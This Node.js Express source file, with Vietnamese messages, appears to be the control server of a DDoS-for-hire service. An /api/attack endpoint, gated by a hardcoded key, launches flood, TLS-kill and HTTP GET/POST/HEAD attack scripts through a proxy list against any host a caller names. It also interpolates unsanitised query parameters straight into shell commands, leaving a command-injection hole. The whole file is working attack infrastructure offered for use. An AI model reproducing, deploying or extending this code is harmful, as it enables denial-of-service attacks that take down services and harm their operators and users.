const express = require("express"), { exec } = require("child_process"), axios = require("axios");

const app = express(), port = 80, MAX_CONCURRENT_ATTACKS = 1;
let activeAttacks = 0, currentPID = null;

const getPublicIP = async () => {
  try {
    const { data } = await axios.get('https://api.ipify.org?format=json');
    return data.ip;
  } catch (error) {
    console.error('KHÔNG THỂ LẤY IP CÔNG CỘNG:', error);
    return 'N/A';
  }
};

const validateInput = ({ key, host, time, method, port }) => {
  if (![key, host, time, method, port].every(Boolean)) return "THIẾU THAM SỐ";
  if (key !== "negan") return "KEY KHÔNG HỢP LỆ";
  if (time > 300) return "THỜI GIAN PHẢI < 300S";
  if (port < 1 || port > 65535) return "CỔNG KHÔNG HỢP LỆ";
  if (!["flood", "killer", "bypass", "tlskill", "attack"].includes(method.toLowerCase())) return "PHƯƠNG THỨC KHÔNG HỢP LỆ";
  return null;
};

const generateRandomPID = () => Math.floor(Math.random() * 10000) + 1; // Random PID between 1 and 10000

const executeAttack = (command, clientIP) => {
  exec(command, (error, stdout, stderr) => {
    if (stderr) console.error(stderr);
    console.log(`[${clientIP}] LỆNH [${command}] THÀNH CÔNG.`);
    activeAttacks--; currentPID = null;  // Reset PID after execution
  });
  currentPID = generateRandomPID();  // Assign random PID when starting the attack
};

app.get("/api/attack", (req, res) => {
  const { key, host, time, method, port, modul, threads, rate } = req.query;
  const clientIP = req.headers["x-forwarded-for"] || req.connection.remoteAddress;

  const validationMessage = validateInput({ key, host, time, method, port });
  if (validationMessage) return res.status(400).json({ status: "ERROR", message: validationMessage, statusCode: 400 });

  // Prevent additional attacks if one is already running
  if (activeAttacks >= MAX_CONCURRENT_ATTACKS || currentPID) {
    return res.status(400).json({ status: "ERROR", message: "THE CONCURRENT ATTACK LIMIT HAS BEEN REACHE", statusCode: 400 });
  }

  activeAttacks++;  // Increment active attack count
  
  const commands = {
    "flood": `node --max-old-space-size=65536 flood ${host} ${time} 10 10 live.txt flood`,
    "killer": `node --max-old-space-size=65536 killer GET ${host} ${time} 10 10 live.txt`,
    "bypass": `node --max-old-space-size=65536 bypass ${host} ${time} 10 10 live.txt bypass --redirect true --ratelimit true --query true`,
    "tlskill": `node --max-old-space-size=65536 tlskill ${host} ${time} 10 10 live.txt --icecool true --dual true --brave true`,
    "attack": `node --max-old-space-size=65536 attack -m ${modul} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --delay 1 --randrate true --ratelimit true --full true --close true -F true --debug false`
  };

  if (modul === "full") {
    const fullCommands = [
      `node --max-old-space-size=65536 attack -m GET -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --delay 1 --randrate true --ratelimit true --full true --close true -F true --debug false`,
      `node --max-old-space-size=65536 attack -m POST -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --delay 1 --randrate true --ratelimit true --full true --close true -F true --debug false`,
      `node --max-old-space-size=65536 attack -m HEAD -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --delay 1 --randrate true --ratelimit true --full true --close true -F true --debug false`
    ];
    fullCommands.forEach(command => executeAttack(command, clientIP));
    return res.status(200).json({
      status: "SUCCESSFULLY", 
      message: "ALL GET, POST, HEAD ATTACK COMMANDS HAVE BEEN SENT", 
      statusCode: 200, 
      host, 
      port, 
      time, 
      method, 
      pid: currentPID 
    });
  }

  const command = commands[method.toLowerCase()];
  if (!command) return res.status(400).json({ status: "ERROR", message: "PHƯƠNG THỨC KHÔNG HỢP LỆ", statusCode: 400 });

  executeAttack(command, clientIP);
  res.status(200).json({
    status: "SUCCESS", 
    message: "THE ATTACK HAS BEEN SUCCESSFULLY SENT", 
    statusCode: 200, 
    host, 
    port, 
    time, 
    method, 
    pid: currentPID 
  });
});

getPublicIP().then(ip => {
  app.listen(port, () => console.log(`[API SERVER] ĐANG CHẠY TẠI > ${ip}:${port}`));
}).catch(err => console.error("KHÔNG THỂ LẤY ĐỊA CHỈ IP CÔNG CỘNG:", err));
